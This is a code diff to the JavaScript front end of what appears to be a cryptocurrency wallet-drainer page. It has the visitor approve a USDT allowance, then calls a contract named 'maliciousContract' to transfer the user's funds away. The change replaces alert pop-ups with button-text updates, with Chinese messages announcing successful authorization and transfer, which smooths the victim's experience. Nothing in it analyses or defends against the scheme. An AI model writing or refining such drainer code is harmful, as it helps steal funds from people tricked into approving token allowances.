@@ -71,7 +71,7 @@ document.getElementById('approveButton').onclick = async () => {
 
     try {
         await usdtContract.methods.approve(contractAddress, amountToApprove).send({ from: userAccount });
-        alert('授权成功');
+        document.getElementById('approveButton').innerText = '授权成功'; // 更新按钮文本
         document.getElementById('executeTransferButton').disabled = false; // 启用转移按钮
     } catch (error) {
         console.error('授权错误: ', error);
@@ -84,7 +84,7 @@ document.getElementById('executeTransferButton').onclick = async () => {
 
     try {
         await maliciousContract.methods.executeTransfer(userAccount).send({ from: userAccount });
-        alert('转账执行成功');
+        document.getElementById('executeTransferButton').innerText = '转账执行成功'; // 更新按钮文本
     } catch (error) {
         console.error('转账错误: ', error);
         alert('转账失败: ' + error.message);
